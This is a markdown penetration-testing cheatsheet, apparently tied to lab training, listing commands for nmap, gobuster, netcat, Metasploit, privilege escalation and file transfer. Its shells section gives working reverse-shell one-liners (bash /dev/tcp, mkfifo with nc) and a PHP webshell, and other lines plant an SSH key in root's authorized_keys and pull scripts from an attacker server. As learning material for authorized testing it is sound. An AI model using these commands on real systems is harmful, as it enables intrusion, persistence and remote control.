# 🛠️ Pentesting Command Cheatsheet

---

## 🔐 VPN & Network Basics
- `sudo openvpn user.ovpn` – Connect to VPN  
- `ifconfig` / `ip a` – Show IP address  
- `netstat -rn` – Show accessible networks  
- `ssh user@10.10.10.10` – SSH into a remote server  
- `ftp 10.129.42.253` – FTP into a remote server  

---

## 🧰 Tmux
- `tmux` – Start tmux  
- `Ctrl + b` – Default prefix  
- `Prefix + c` – New window  
- `Prefix + 1` – Switch to window 1  
- `Prefix + Shift + %` – Split pane vertically  
- `Prefix + Shift + "` – Split pane horizontally  
- `Prefix + →` – Switch to the right pane  

---

## 📝 Vim
- `vim file` – Open file  
- `Esc + i` – Insert mode  
- `Esc` – Normal mode  
- `x` – Cut character  
- `dw` – Cut word  
- `dd` – Cut full line  
- `yw` – Copy word  
- `yy` – Copy full line  
- `p` – Paste  
- `:1` – Go to line 1  
- `:w` – Save  
- `:q` – Quit  
- `:q!` – Quit without saving  
- `:wq` – Save and quit  

---

## 🔍 Nmap
- `nmap 10.129.42.253` – Basic scan  
- `nmap -sV -sC -p- 10.129.42.253` – Full script scan  
- `locate scripts/citrix` – Locate Nmap scripts  
- `nmap --script smb-os-discovery.nse -p445 10.10.10.40` – Run specific script  

---

## 🧫 Netcat
- `netcat 10.10.10.10 22` – Grab banner  
- `nc -lvnp 1234` – Start listener  
- `nc 10.10.10.1 1234` – Connect to bind shell  

---

## 📁 SMB Client
- `smbclient -N -L \\10.129.42.253` – List shares  
- `smbclient \\10.129.42.253\users` – Access share  

---

## 📡 SNMP
- `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0` – SNMP scan  
- `onesixtyone -c dict.txt 10.129.42.254` – Brute-force SNMP  

---

## 🌐 Gobuster
- `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt` – Directory brute-force  
- `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` – Subdomain scan  

---

## 🌍 Curl
- `curl -IL https://www.inlanefreight.com` – Grab headers  
- `curl 10.10.10.121/robots.txt` – Check for robots.txt  
- `curl http://SERVER_IP:PORT/shell.php?cmd=id` – Execute webshell  
- `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh` – Download file  

---

## 🔍 WhatWeb
- `whatweb 10.10.10.121` – Detect web tech  

---

## 🌐 Firefox Shortcut
- `Ctrl + U` – View page source  

---

## 📚 SearchSploit
- `searchsploit openssh 7.2` – Search exploit  

---

## 🧨 Metasploit (MSFConsole)
- `msfconsole` – Launch MSF  
- `search exploit eternalblue` – Search for exploit  
- `use exploit/windows/smb/ms17_010_psexec` – Use module  
- `show options` – Show module options  
- `set RHOSTS 10.10.10.40` – Set target  
- `check` – Check if vulnerable  
- `exploit` – Run exploit  

---

## 🐚 Shells & Reverse Shells
- `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'` – Reverse shell  
- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f` – Reverse shell alt  
- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f` – Bind shell  
- `python -c 'import pty; pty.spawn("/bin/bash")'` – TTY upgrade 1  
- `Ctrl + Z → stty raw -echo → fg → Enter x2` – TTY upgrade 2  
- `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php` – PHP webshell  

---

## 🪜 Privilege Escalation
- `./linpeas.sh` – Run LinPEAS  
- `sudo -l` – List sudo privileges  
- `sudo -u user /bin/echo Hello World!` – Run as user  
- `sudo su -` – Root shell  
- `sudo su user -` – Switch user  
- `ssh-keygen -f key` – Generate SSH key  
- `echo "ssh-rsa AAAAB... user@parrot" >> /root/.ssh/authorized_keys` – Add key to authorized  
- `ssh root@10.10.10.10 -i key` – SSH using key  

---

## 📦 Transferring Files
- `python3 -m http.server 8000` – Start HTTP server  
- `wget http://10.10.14.1:8000/linpeas.sh` – Download via wget  
- `scp linenum.sh user@remotehost:/tmp/linenum.sh` – Upload via SCP  
- `base64 shell -w 0` – Encode file  
- `echo f0VMR... | base64 -d > shell` – Decode file  
- `md5sum shell` – Check file hash  
